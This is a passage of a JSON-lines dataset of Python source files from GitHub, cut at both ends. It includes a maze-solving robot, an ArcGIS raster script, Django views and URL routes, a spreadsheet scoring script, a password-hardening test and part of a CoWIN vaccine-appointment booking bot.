0 <= y < self.MAZE_HEIGHT\n\n    def flood_fill(self):\n        q = Queue()\n        # end positions\n        q.put((7, 7))\n        q.put((7, 8))\n        q.put((8, 7))\n        q.put((8, 8))\n        visited = get_visited(self.MAZE_WIDTH, self.MAZE_HEIGHT)\n        visited[7][7] = True\n        visited[7][8] = True\n        visited[8][7] = True\n        visited[8][8] = True\n        while not q.empty():\n            size = q.qsize()\n            for k in range(size):\n                x, y = q.get()\n                for i in range(len(self.drs)):\n                    new_x = x + self.dcs[i]\n                    new_y = y + self.drs[i]\n                    if self.is_valid(new_x, new_y) and not visited[new_x][new_y] and self.maze[x][y][i] != 1:\n                        visited[new_x][new_y] = True\n                        self.maze_weight[new_x][new_y] = self.maze_weight[x][y] + 1\n                        API.setText(new_x, new_y, str(self.maze_weight[new_x][new_y]))\n                        q.put((new_x, new_y))\n\n    def update_maze(self, front_wall, right_wall, left_wall):\n        if front_wall:\n            front = get_front(self.BOT_DIRECTION)\n            self.set_wall(self.curr_x, self.curr_y, front)\n            self.maze[self.curr_x][self.curr_y][front] = 1\n            self.mark_opposite_wall(self.curr_x, self.curr_y, front)\n        if right_wall:\n            right = get_right(self.BOT_DIRECTION)\n            self.set_wall(self.curr_x, self.curr_y, right)\n            self.maze[self.curr_x][self.curr_y][right] = 1\n            self.mark_opposite_wall(self.curr_x, self.curr_y, right)\n        if left_wall:\n            left = get_left(self.BOT_DIRECTION)\n            self.set_wall(self.curr_x, self.curr_y, left)\n            self.maze[self.curr_x][self.curr_y][left] = 1\n            self.mark_opposite_wall(self.curr_x, self.curr_y, left)\n\n    def mark_opposite_wall(self, x, y, direction):\n        opposite = get_opposite_direction(direction)\n        new_x = x + self.dcs[direction]\n        new_y = y + self.drs[direction]\n        if self.is_valid(new_x, new_y):\n            self.maze[new_x][new_y][opposite] = 1\n\n    def get_next_move(self):\n        self.flood_fill()\n        new_direction = self.BOT_DIRECTION\n        curr_score = self.maze_weight[self.curr_x][self.curr_y]\n        best_x = self.curr_x\n        best_y = self.curr_y\n        for i in range(len(self.drs)):\n            new_x = self.curr_x + self.dcs[i]\n            new_y = self.curr_y + self.drs[i]\n            if self.maze[self.curr_x][self.curr_y][i] != 1 and self.maze_weight[new_x][new_y] < curr_score:\n                curr_score = self.maze_weight[new_x][new_y]\n                new_direction = i\n                best_x = new_x\n                best_y = new_y\n        self.update_position(best_x, best_y, new_direction)\n        return new_direction\n\n    def update_position(self, x, y, direction):\n        self.BOT_DIRECTION = direction\n        # self.log('Curr X:' + str(self.curr_x) + ' ' + 'New X:' + str(x))\n        self.curr_x = x\n        self.curr_y = y\n\n    def is_end(self):\n        return self.maze_weight[self.curr_x][self.curr_y] == 0\n\n    def set_wall(self, x, y, direction):\n        # self.log('Setting wall:' + '(' + str(x) + ',' + str(y) + ') ' + str(direction))\n        if direction == 0:\n            API.setWall(x, y, 'n')\n        elif direction == 1:\n            API.setWall(x, y, 'e')\n        elif direction == 2:\n            API.setWall(x, y, 's')\n        else:\n            API.setWall(x, y, 'w')\n\n    def print_maze(self):\n        s = ''\n        for i in range(self.MAZE_HEIGHT):\n            for j in range(self.MAZE_WIDTH):\n                s += str(self.maze_weight[i][j])\n                s += ' '\n            s += '\\n'\n        return s\n\n\n# maze = list()\n# maze_weight = list()\n# MAZE_WIDTH = API.mazeWidth()\n# MAZE_HEIGHT = API.mazeHeight()\n# BOT_DIRECTION = 0  # default upwards\n#\n# for i in range(MAZE_HEIGHT):\n#     temp = list()\n#     weight_temp = list()\n#     for j in range(MAZE_WIDTH):\n#         walls = list()\n#         weight_temp.append(0)\n#         for k in range(4):\n#             walls.append(0)\n#         temp.append(walls)\n#     maze.append(temp)\n#     maze_weight.append(weight_temp)\n#\n# curr_x = 0\n# curr_y = 0\n#\n#\n# drs = [1, 0, -1, 0]\n# dcs = [0, 1, 0, -1]\n#\n#\n# def log(string):\n#     sys.stderr.write(\"{}\\n\".format(string))\n#     sys.stderr.flush()\n#\n#\n# def is_valid(x, y):\n#     return 0 <= x < MAZE_WIDTH and 0 <= y < MAZE_HEIGHT\n#\n#\n# def flood_fill():\n#     global maze\n#     q = Queue()\n#     # end positions\n#     q.put((7, 7))\n#     q.put((7, 8))\n#     q.put((8, 7))\n#     q.put((8, 8))\n#     visited = get_visited(MAZE_WIDTH, MAZE_HEIGHT)\n#     visited[7][7] = True\n#     visited[7][8] = True\n#     visited[8][7] = True\n#     visited[8][8] = True\n#\n#     while not q.empty():\n#         size = q.qsize()\n#         for k in range(size):\n#             x, y = q.get()\n#             for i in range(len(drs)):\n#                 new_x = x + dcs[i]\n#                 new_y = y + drs[i]\n#                 if is_valid(new_x, new_y) and not visited[new_x][new_y] and maze[x][y][i] != 1:\n#                     visited[new_x][new_y] = True\n#                     maze_weight[new_x][new_y] = maze_weight[x][y] + 1\n#                     API.setText(new_x, new_y, str(maze_weight[new_x][new_y]))\n#                     q.put((new_x, new_y))\n#\n#\n# def update_maze():\n#     global maze\n#     if API.wallFront():\n#         front = get_front(BOT_DIRECTION)\n#         maze[curr_x][curr_y][front] = 1\n#         mark_opposite_wall(curr_x, curr_y, front)\n#     if API.wallRight():\n#         right = get_right(BOT_DIRECTION)\n#         maze[curr_x][curr_y][right] = 1\n#         mark_opposite_wall(curr_x, curr_y, right)\n#     if API.wallLeft():\n#         left = get_left(BOT_DIRECTION)\n#         maze[curr_x][curr_y][get_left(BOT_DIRECTION)] = 1\n#         mark_opposite_wall(curr_x, curr_y, left)\n#\n#\n# def mark_opposite_wall(x, y, direction):\n#     opposite = get_opposite_direction(direction)\n#     new_x = x + dcs[direction]\n#     new_y = y + drs[direction]\n#     if is_valid(new_x, new_y):\n#         maze[new_x][new_y][opposite] = 1\n#\n#\n# def get_next_move():\n#     flood_fill()\n#     new_direction = BOT_DIRECTION\n#     curr_score = maze_weight[curr_x][curr_y]\n#     best_x = 0\n#     best_y = 0\n#     for i in range(len(drs)):\n#         new_x = curr_x + drs[i]\n#         new_y = curr_y + dcs[i]\n#         if maze[curr_x][curr_y][i] != 1 and maze_weight[new_x][new_y] < curr_score:\n#             curr_score = maze_weight[new_x][new_y]\n#             new_direction = i\n#             best_x = new_x\n#             best_y = new_y\n#     update_position(best_x, best_y, new_direction)\n#     return new_direction\n#\n#\n# def update_position(x, y, direction):\n#     global curr_x, curr_y, BOT_DIRECTION\n#     BOT_DIRECTION = direction\n#     curr_x = x\n#     curr_y = y\n#\n#\n# def is_end():\n#     global curr_x, curr_y\n#     return maze_weight[curr_x][curr_y] == 0\n#\n#\n# def print_maze():\n#     s = ''\n#     for i in range(MAZE_HEIGHT):\n#         for j in range(MAZE_WIDTH):\n#             s += str(maze_weight[i][j])\n#             s += ' '\n#         s += '\\n'\n#     return s\n"}
{"blob_id": "1fb6a3c298864d61c8bcb5c823457898adc4494b", "directory_id": "3e917645a0e1375189c8ee8c1e93ed15348111ef", "path": "/projects/synthesis/intensification/archive/intensification_w_napplication/intensification_n_application.py", "content_id": "7c3748d0774424a4b983cf49852706984812818c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mbougie/gibbs", "snapshot_id": "d4544e688ce2b63530535e1f5102328aece30e0d", "revision_id": "39d5dc0866fc0dd149d0cf1f22bfd20911a9d29e", "branch_name": "refs/heads/master", "visit_date": "2021-01-12 06:59:27.214123", "revision_date": "2020-01-07 15:48:12", "committer_date": "2020-01-07 15:48:12", "github_id": "83906717", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1081", "extension": "py", "content": "import arcpy, os  \nfrom arcpy import env  \nfrom arcpy.sa import *  \nimport glob\n\n\narcpy.CheckOutExtension(\"Spatial\")  \narcpy.env.overwriteOutput = True  \n\n\nenv.workspace = 'D:\\\\projects\\\\usxp\\\\deliverables\\\\maps\\\\synthesis\\\\intensification\\\\eric\\\\n_application\\\\n_application.gdb'\n\nscene_list = list(range(1, 6))\nyears_list = list(range(2007, 2011))\n# years_list = [2007]\nprint years_list\n\nfor scene in scene_list:\n\n\tprint 'scene', scene\n\n\tprocessed_list = []\n\tprint 'processed_list', processed_list\n\tfor year in years_list:\n\t\tprint 'year', year\n\n\t\traster_list = glob.glob('D:\\\\projects\\\\usxp\\\\deliverables\\\\maps\\\\synthesis\\\\intensification\\\\eric\\\\n_application\\\\Scen{}\\\\*_{}.tif'.format(str(scene), str(year)))\n\n\t\tprint 'raster_list', raster_list\n\n\t\t# Execute CellStatistics  \n\t\tprocessed_list.append(CellStatistics(raster_list, \"SUM\", \"DATA\"))\n\n\t\traster_list = None\n\n\traster_mean = CellStatistics(processed_list, \"MEAN\", \"DATA\")\n\n\tdel processed_list[:]\n\n\t# Save the output   \n\traster_mean.save(\"Napplication2007_2016mean_Scen{}\".format(str(scene))) \n\n\traster_mean = None\n\n\n\n\n\n\n\t\n"}
{"blob_id": "25057827549d7a5f3db628f92db3293b8103f93f", "directory_id": "6ed68e568357497ae7156130be65db5efc524c2a", "path": "/main/urls.py", "content_id": "e8b6baa7ff5b0b49fa592aaf46fb002379152c75", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ckd1618/portfolio", "snapshot_id": "4a5aa03b0b2360d1559546d20d6912e084b4ae56", "revision_id": "52a50cbc17b026dd09527d27e9f6c3082f0b679e", "branch_name": "refs/heads/master", "visit_date": "2023-05-01 11:31:27.035287", "revision_date": "2019-08-01 04:31:50", "committer_date": "2019-08-01 04:31:50", "github_id": "189685120", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2023-04-21 20:33:02", "gha_created_at": "2019-06-01 03:18:59", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "486", "extension": "py", "content": "from django.urls import path\nfrom . import views\n\napp_name = 'main'\n\nurlpatterns = [\n  path('', views.index, name='index'),\n  path('ckd', views.ckd, name='ckd'),\n  path('register', views.register, name='register'),\n  path('login', views.login, name='login'),\n  path('dashboard', views.dashboard, name='dashboard'),\n  path('logout', views.logout, name='logout'),\n  path('createNote', views.createNote, name=\"createNote\"),\n  path('delete/<int:num1>', views.deletenum, name=\"deletenum\"),\n]"}
{"blob_id": "45c5c3d08f99c1321994da4c1fa6fbf332572491", "directory_id": "e3d234faada65d7506c0f21bc2e6a5a67d44f057", "path": "/xls_results.py", "content_id": "4af049eac97dcbb5ccd1be8d5161beeb75644844", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "kxdc/group-chats-capture", "snapshot_id": "eea71bdaac559fc219b1f5a6b045605195aadf91", "revision_id": "f0c4305a80ae451fd3100a636e95a176aed20e5f", "branch_name": "refs/heads/main", "visit_date": "2023-06-03 19:56:47.243889", "revision_date": "2021-06-30 12:41:06", "committer_date": "2021-06-30 12:41:06", "github_id": "360306901", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "MIT", "gha_event_created_at": "2021-05-09 21:29:13", "gha_created_at": "2021-04-21 21:08:49", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2556", "extension": "py", "content": "import os\nimport xlrd\n\nverses_list = [\"aavbb\", \"ccvdd\",\n               \"eevff\", \"ggvhh\",\n               \"iivjj\", \"kkvll\",\n               \"mmvnn\", \"uuvww\"]\n\ndef exists_file(filename):\n\n    if not os.path.exists(filename):\n        print(filename, \" is empty\")\n        return False\n    else:\n        print(\"processing \", filename)\n        return True\n\n\ndef check_same_status(user_guess, true_fact):\n\n    same_num = 0\n    status = ''\n\n    for i in range(len(true_fact)):\n        if user_guess[i] == \"X\":\n            # return \"null\"\n            status += \"N\"\n        elif user_guess[i] == true_fact[i]:\n            same_num += 1\n            status += \"Y\"\n        else:\n            status += \"N\"\n\n    status = status + ':' + str(same_num)\n    # print(user_guess, \"&\", true_fact, \" -- \", status)\n    return status\n\n\ndef result_of_single_match(user_input, match_index):\n\n    if len(user_input) == 0: \n        return \"_\";\n\n    team_A = verses_list[match_index].split('v')[0]\n    team_B = verses_list[match_index].split('v')[1]\n\n    if team_A in user_input:\n        return \"A\"\n    elif team_B in user_input:\n        return \"B\"\n    else:\n        return \"X\"\n\n\ndef generate_user_guess(worksheet, rows, cols):\n\n    for i in range(rows):\n        single_row = worksheet.row_values(i)\n\n        # print(single_row)\n        user_guess = \"\"\n        user_index = single_row[0]\n        user_name = single_row[1]\n        if type(user_index) == str:\n            continue\n\n        for j in range(len(final_results)):\n            user_guess += result_of_single_match(single_row[j+3], j)\n\n        user_result = check_same_status(user_guess, final_results)\n\n        correct_num = int(user_result.split(':')[1])\n        tuple_to_save = (int(user_index), user_name, correct_num)\n        final_list[correct_num].append(tuple_to_save)\n        print(int(user_index), user_name, \" -- \", user_result)\n\n    \ndef process_sheet(worksheet):\n\n    ws_rows = worksheet.nrows\n    ws_cols = worksheet.ncols\n    user_res = generate_user_guess(worksheet, ws_rows, ws_cols)\n\n    \ndef process_file(filename):\n\n    if exists_file(filename):\n        workbook = xlrd.open_workbook(filename)\n    else:\n        return\n\n    process_sheet(workbook.sheet_by_index(0))\n\n\nif __name__ == '__main__':\n\n    xls_name = \"./all_user_results.xls\"\n    final_results = \"BAAABAAA\"\n    final_list = []\n    list_pd= []\n    \n    final_list = [[] for _ in range(len(final_results)+1)]\n    print(final_list)\n\n    process_file(xls_name)\n    print(final_list[len(final_results)-3])\n    print(final_list[len(final_results)-4])\n    \n"}
{"blob_id": "ea77c9e53d17d42f0bb662d680e1703d8c56c1a1", "directory_id": "a1150a0d487453be73d0a724b5d9a4c7ca69f0bd", "path": "/test.py", "content_id": "692767798ad1ba065c7b0a0d40c558cb19ee7dd2", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "aten2001/cs6238-project1", "snapshot_id": "86afaaaf370d7411f240cb2f43ab2ad58ef23576", "revision_id": "0e793491c5a63a09b62e2b534fcff31a90e5988d", "branch_name": "refs/heads/master", "visit_date": "2021-06-03 09:30:43.982236", "revision_date": "2015-10-18 20:48:45", "committer_date": "2015-10-18 20:48:45", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1601", "extension": "py", "content": "from cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives import hashes, hmac\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nimport Crypto.Util.number\nimport Crypto.Random.random\nimport os\nimport helpers\nimport HistoryFile\nimport InstructionTable\nimport Config\nimport login\n\ndef main():\n    print \"Creating user...\"\n    user = login.createUser(\"kyle\", \"CorrectPassword\")\n    print \"hpwd:  {0}\".format(user.hpwd)\n    table = user.instructiontable.generateTable()\n    print table\n\n    print \"Teting history file encryption:\"\n    enc_history = user.historyfile.encrypt()\n    print enc_history\n    print \"Testing history file decryption (with original hpwd):\"\n    dec_history = user.getHistoryFile(enc_history)\n    print dec_history\n\n    backend = default_backend()\n    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=user.salt,iterations=10000,backend=backend)\n    G = long(kdf.derive(user.password).encode('hex'),16)\n    ti = 10\n    i = 0\n\n    points = []\n    features = [18,10,-2,20,10,4,2,8,6,17,23,20,27,7]\n\n    for feature in features:\n      if feature < 10:\n        points.append([table[i][0] * 2,table[i][1]])\n      else:\n        points.append([table[i][0] * 2 + 1, table[i][2]])\n      i += 1\n\n    print \"Getting points from features {0}\".format(features)\n    print points\n\n    print \"Trying to generate hpwd'...\"\n    print \"hpwd\\': {0}\".format(helpers.modular_lagrange_interpolation(0, points, user.q))\n\n    print \"Adding login features to history file\"\n    user.historyfile.addEntry(features)\n\nif __name__ == \"__main__\":\n    main()\n"}
{"blob_id": "4432d6adf0e7f07f417e89353f18507a8974e082", "directory_id": "9516dde424e3fbbeeb18d1f9da081733a09c5346", "path": "/kitsune/products/views.py", "content_id": "121ddb4e464e8681ef4ccee925076537350880b1", "detected_licenses": "[]", "license_type": "permissive", "repo_name": "wescthatsme33/kitsune", "snapshot_id": "a6349e4fd1b0c4168dd5b6f71ea6dd3117a4e5c5", "revision_id": "6a29049de625c0c93997dc55b36c9c39262d0057", "branch_name": "refs/heads/master", "visit_date": "2022-10-10 23:09:05.441494", "revision_date": "2020-06-01 08:05:59", "committer_date": "2020-06-01 08:05:59", "github_id": "268461178", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "BSD-3-Clause", "gha_event_created_at": "2020-06-01 08:05:03", "gha_created_at": "2020-06-01 08:05:02", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3294", "extension": "py", "content": "import json\n\nfrom django.http import HttpResponse\nfrom django.shortcuts import get_object_or_404, render\nfrom product_details import product_details\n\nfrom kitsune.products.models import Product, Topic\nfrom kitsune.wiki.decorators import check_simple_wiki_locale\nfrom kitsune.wiki.facets import documents_for, topics_for\nfrom kitsune.wiki.utils import get_featured_articles\n\n\n@check_simple_wiki_locale\ndef product_list(request):\n    \"\"\"The product picker page.\"\"\"\n    template = \"products/products.html\"\n    products = Product.objects.filter(visible=True)\n    return render(request, template, {\"products\": products})\n\n\n@check_simple_wiki_locale\ndef product_landing(request, slug):\n    \"\"\"The product landing page.\"\"\"\n    product = get_object_or_404(Product, slug=slug)\n    user = request.user\n    template = \"products/product.html\"\n\n    if request.is_ajax():\n        # Return a list of topics/subtopics for the product\n        topic_list = list()\n        for t in Topic.objects.filter(product=product, visible=True):\n            topic_list.append({\"id\": t.id, \"title\": t.title})\n        return HttpResponse(\n            json.dumps({\"topics\": topic_list}), content_type=\"application/json\"\n        )\n\n    if slug == \"firefox\":\n        latest_version = product_details.firefox_versions[\"LATEST_FIREFOX_VERSION\"]\n    else:\n        versions = product.versions.filter(default=True)\n        if versions:\n            latest_version = versions[0].min_version\n        else:\n            latest_version = 0\n\n    return render(\n        request,\n        template,\n        {\n            \"product\": product,\n            \"products\": Product.objects.filter(visible=True),\n            \"topics\": topics_for(product=product, parent=None),\n            \"search_params\": {\"product\": slug},\n            \"latest_version\": latest_version,\n            \"subscribed_products_ids\": (\n                user.profile.products.all().values_list(\"id\", flat=True)\n                if user.is_authenticated()\n                else []\n            ),\n            \"featured\": get_featured_articles(product)\n        }\n    )\n\n\n@check_simple_wiki_locale\ndef document_listing(request, product_slug, topic_slug, subtopic_slug=None):\n    \"\"\"The document listing page for a product + topic.\"\"\"\n    product = get_object_or_404(Product, slug=product_slug)\n    topic = get_object_or_404(\n        Topic, slug=topic_slug, product=product, parent__isnull=True\n    )\n    template = \"products/documents.html\"\n\n    doc_kw = {\"locale\": request.LANGUAGE_CODE, \"products\": [product]}\n\n    if subtopic_slug is not None:\n        subtopic = get_object_or_404(\n            Topic, slug=subtopic_slug, product=product, parent=topic\n        )\n        doc_kw[\"topics\"] = [subtopic]\n    else:\n        subtopic = None\n        doc_kw[\"topics\"] = [topic]\n\n    documents, fallback_documents = documents_for(**doc_kw)\n\n    return render(\n        request,\n        template,\n        {\n            \"product\": product,\n            \"topic\": topic,\n            \"subtopic\": subtopic,\n            \"topics\": topics_for(product=product, parent=None),\n            \"subtopics\": topics_for(product=product, parent=topic),\n            \"documents\": documents,\n            \"fallback_documents\": fallback_documents,\n            \"search_params\": {\"product\": product_slug},\n        },\n    )\n"}
{"blob_id": "dc949c9f7eb84f3cd2c60aad620036ec2ef0c0d4", "directory_id": "7d8f1888db43ee09bf0088495df49acba4f54d7a", "path": "/src/utils.py", "content_id": "384942444c70a66a0f12ea7ecd627271e53f0a49", "detected_licenses": "['LicenseRef-scancode-warranty-disclaimer']", "license_type": "permissive", "repo_name": "dhavalsavalia/covid-vaccine-booking", "snapshot_id": "984d7d34d331b1d5112f62fa02bf740687c0681b", "revision_id": "b64c037f8b1892141d3f4d989dd16bc9d9dcfce1", "branch_name": "refs/heads/main", "visit_date": "2023-04-27 18:42:05.655044", "revision_date": "2021-05-11 16:56:41", "committer_date": "2021-05-11 16:56:41", "github_id": "366276742", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2021-05-11 06:20:22", "gha_created_at": "2021-05-11 06:20:21", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "31337", "extension": "py", "content": "import json\nfrom hashlib import sha256\nfrom collections import Counter\nfrom inputimeout import inputimeout, TimeoutOccurred\nimport tabulate, copy, time, datetime, requests, sys, os, random\nfrom captcha import captcha_builder, captcha_builder_auto\n\nBOOKING_URL = \"https://cdn-api.co-vin.in/api/v2/appointment/schedule\"\nBENEFICIARIES_URL = \"https://cdn-api.co-vin.in/api/v2/appointment/beneficiaries\"\nCALENDAR_URL_DISTRICT = \"https://cdn-api.co-vin.in/api/v2/appointment/sessions/calendarByDistrict?district_id={0}&date={1}\"\nCALENDAR_URL_PINCODE = \"https://cdn-api.co-vin.in/api/v2/appointment/sessions/calendarByPin?pincode={0}&date={1}\"\nCAPTCHA_URL = \"https://cdn-api.co-vin.in/api/v2/auth/getRecaptcha\"\nOTP_PUBLIC_URL = \"https://cdn-api.co-vin.in/api/v2/auth/public/generateOTP\"\nOTP_PRO_URL = \"https://cdn-api.co-vin.in/api/v2/auth/generateMobileOTP\"\n\nWARNING_BEEP_DURATION = (1000, 5000)\n\n\ntry:\n    import winsound\n\nexcept ImportError:\n    import os\n\n    if sys.platform == \"darwin\":\n\n        def beep(freq, duration):\n            # brew install SoX --> install SOund eXchange universal sound sample translator on mac\n            os.system(\n                f\"play -n synth {duration/1000} sin {freq} >/dev/null 2>&1\")\n    else:\n\n        def beep(freq, duration):\n            # apt-get install beep  --> install beep package on linux distros before running\n            os.system('beep -f %s -l %s' % (freq, duration))\n\nelse:\n\n    def beep(freq, duration):\n        winsound.Beep(freq, duration)\n\n\ndef viable_options(resp, minimum_slots, min_age_booking, fee_type):\n    options = []\n    if len(resp[\"centers\"]) >= 0:\n        for center in resp[\"centers\"]:\n            for session in center[\"sessions\"]:\n                if (\n                    (session[\"available_capacity\"] >= minimum_slots)\n                    and (session[\"min_age_limit\"] <= min_age_booking)\n                    and (center[\"fee_type\"] in fee_type)\n                ):\n                    out = {\n                        \"name\": center[\"name\"],\n                        \"district\": center[\"district_name\"],\n                        \"pincode\": center[\"pincode\"],\n                        \"center_id\": center[\"center_id\"],\n                        \"available\": session[\"available_capacity\"],\n                        \"date\": session[\"date\"],\n                        \"slots\": session[\"slots\"],\n                        \"session_id\": session[\"session_id\"],\n                    }\n                    options.append(out)\n\n                else:\n                    pass\n    else:\n        pass\n\n    return options\n\n\ndef display_table(dict_list):\n    \"\"\"\n    This function\n        1. Takes a list of dictionary\n        2. Add an Index column, and\n        3. Displays the data in tabular format\n    \"\"\"\n    header = [\"idx\"] + list(dict_list[0].keys())\n    rows = [[idx + 1] + list(x.values()) for idx, x in enumerate(dict_list)]\n    print(tabulate.tabulate(rows, header, tablefmt=\"grid\"))\n\n\ndef display_info_dict(details):\n    for key, value in details.items():\n        if isinstance(value, list):\n            if all(isinstance(item, dict) for item in value):\n                print(f\"\\t{key}:\")\n                display_table(value)\n            else:\n                print(f\"\\t{key}\\t: {value}\")\n        else:\n            print(f\"\\t{key}\\t: {value}\")\n\n\ndef confirm_and_proceed(collected_details):\n    print(\n        \"\\n================================= Confirm Info =================================\\n\"\n    )\n    display_info_dict(collected_details)\n\n    confirm = input(\"\\nProceed with above info (y/n Default y) : \")\n    confirm = confirm if confirm else \"y\"\n    if confirm != \"y\":\n        print(\"Details not confirmed. Exiting process.\")\n        os.system(\"pause\")\n        sys.exit()\n\n\ndef save_user_info(filename, details):\n    print(\n        \"\\n================================= Save Info =================================\\n\"\n    )\n    save_info = input(\n        \"Would you like to save this as a JSON file for easy use next time?: (y/n Default y): \"\n    )\n    save_info = save_info if save_info else \"y\"\n    if save_info == \"y\":\n        with open(filename, \"w\") as f:\n            json.dump(details, f)\n\n        print(f\"Info saved to {filename} in {os.getcwd()}\")\n\n\ndef get_saved_user_info(filename):\n    with open(filename, \"r\") as f:\n        data = json.load(f)\n\n    return data\n\n\ndef collect_user_details(request_header):\n    # Get Beneficiaries\n    print(\"Fetching registered beneficiaries.. \")\n    beneficiary_dtls = get_beneficiaries(request_header)\n\n    if len(beneficiary_dtls) == 0:\n        print(\"There should be at least one beneficiary. Exiting.\")\n        os.system(\"pause\")\n        sys.exit(1)\n\n    # Make sure all beneficiaries have the same type of vaccine\n    vaccine_types = [beneficiary[\"vaccine\"] for beneficiary in beneficiary_dtls]\n    vaccines = Counter(vaccine_types)\n\n    if len(vaccines.keys()) != 1:\n        print(\n            f\"All beneficiaries in one attempt should have the same vaccine type. Found {len(vaccines.keys())}\"\n        )\n        os.system(\"pause\")\n        sys.exit(1)\n\n    vaccine_type = vaccine_types[\n        0\n    ]  # if all([beneficiary['status'] == 'Partially Vaccinated' for beneficiary in beneficiary_dtls]) else None\n    if not vaccine_type:\n        print(\n            \"\\n================================= Vaccine Info =================================\\n\"\n        )\n        vaccine_type = get_vaccine_preference()\n\n    print(\n        \"\\n================================= Location Info =================================\\n\"\n    )\n    # get search method to use\n    search_option = input(\n        \"\"\"Search by Pincode? Or by State/District? \\nEnter 1 for Pincode or 2 for State/District. (Default 2) : \"\"\"\n    )\n\n    if not search_option or int(search_option) not in [1, 2]:\n        search_option = 2\n    else:\n        search_option = int(search_option)\n\n    if search_option == 2:\n        # Collect vaccination center preferance\n        location_dtls = get_districts(request_header)\n\n    else:\n        # Collect vaccination center preferance\n        location_dtls = get_pincodes()\n\n    print(\n        \"\\n================================= Additional Info =================================\\n\"\n    )\n\n    # Set filter condition\n    minimum_slots = input(\n        f\"Filter out centers with availability less than ? Minimum {len(beneficiary_dtls)} : \"\n    )\n    if minimum_slots:\n        minimum_slots = (\n            int(minimum_slots)\n            if int(minimum_slots) >= len(beneficiary_dtls)\n            else len(beneficiary_dtls)\n        )\n    else:\n        minimum_slots = len(beneficiary_dtls)\n\n    # Get refresh frequency\n    refresh_freq = input(\n        \"How often do you want to refresh the calendar (in seconds)? Default 15. Minimum 1. : \"\n    )\n    refresh_freq = int(refresh_freq) if refresh_freq and int(refresh_freq) >= 1 else 15\n\n    # Get search start date\n    start_date = input(\n        \"\\nSearch for next seven day starting from when?\\nUse 1 for today, 2 for tomorrow, or provide a date in the format yyyy-mm-dd. Default 2: \"\n    )\n    if not start_date:\n        start_date = 2\n    elif start_date in [\"1\", \"2\"]:\n        start_date = int(start_date)\n    else:\n        try:\n            datetime.datetime.strptime(start_date, \"%Y-%m-%d\")\n        except ValueError:\n            start_date = 2\n\n    # Get preference of Free/Paid option\n    fee_type = get_fee_type_preference()\n\n    print(\n        \"\\n=========== CAUTION! =========== CAUTION! CAUTION! =============== CAUTION! =======\\n\"\n    )\n    print(\n        \"===== BE CAREFUL WITH THIS OPTION! AUTO-BOOKING WILL BOOK THE FIRST AVAILABLE CENTRE, DATE, AND A RANDOM SLOT! =====\"\n    )\n    auto_book = \"yes-please\"\n\n\n    print(\"\\n================================= Captcha Automation =================================\\n\")\n    print(\"======== Caution: This will require a paid API key from anti-captcha.com =============\")\n\n    captcha_automation = input(\"Do you want to automate captcha autofill? (yes or no) Default no: \")\n    captcha_automation = \"no\" if not captcha_automation else captcha_automation\n    if captcha_automation==\"yes\":\n        captcha_automation_api_key = input(\"Enter your Anti-Captcha API key: \")\n    else:\n        captcha_automation_api_key = None\n\n    collected_details = {\n        \"beneficiary_dtls\": beneficiary_dtls,\n        \"location_dtls\": location_dtls,\n        \"search_option\": search_option,\n        \"minimum_slots\": minimum_slots,\n        \"refresh_freq\": refresh_freq,\n        \"auto_book\": auto_book,\n        \"start_date\": start_date,\n        \"vaccine_type\": vaccine_type,\n        \"fee_type\": fee_type,\n        'captcha_automation': captcha_automation,\n        'captcha_automation_api_key': captcha_automation_api_key\n    }\n\n    return collected_details\n\ndef filter_centers_by_age(resp, min_age_booking):\n\n    if min_age_booking >= 45:\n        center_age_filter = 45\n    else:\n        center_age_filter = 18\n\n    if \"centers\" in resp:\n        for center in resp[\"centers\"]: \n            if center[\"sessions\"][0]['min_age_limit'] != center_age_filter:\n                resp[\"centers\"].remove(center)\n\n    return resp    \n\ndef check_calendar_by_district(\n    request_header,\n    vaccine_type,\n    location_dtls,\n    start_date,\n    minimum_slots,\n    min_age_booking,\n    fee_type,\n):\n    \"\"\"\n    This function\n        1. Takes details required to check vaccination calendar\n        2. Filters result by minimum number of slots available\n        3. Returns False if token is invalid\n        4. Returns list of vaccination centers & slots if available\n    \"\"\"\n    try:\n        print(\n            \"===================================================================================\"\n        )\n        today = datetime.datetime.today()\n        base_url = CALENDAR_URL_DISTRICT\n\n        if vaccine_type:\n            base_url += f\"&vaccine={vaccine_type}\"\n\n        options = []\n        for location in location_dtls:\n            resp = requests.get(\n                base_url.format(location[\"district_id\"], start_date),\n                headers=request_header,\n            )\n\n            if resp.status_code == 401:\n                print(\"TOKEN INVALID\")\n                return False\n\n            elif resp.status_code == 200:\n                resp = resp.json()\n\n                resp = filter_centers_by_age(resp, min_age_booking)\n\n                if \"centers\" in resp:\n                    print(\n                        f\"Centers available in {location['district_name']} from {start_date} as of {today.strftime('%Y-%m-%d %H:%M:%S')}: {len(resp['centers'])}\"\n                    )\n                    options += viable_options(\n                        resp, minimum_slots, min_age_booking, fee_type\n                    )\n\n            else:\n                pass\n\n        for location in location_dtls:\n            if location[\"district_name\"] in [option[\"district\"] for option in options]:\n                for _ in range(2):\n                    beep(location[\"alert_freq\"], 150)\n        return 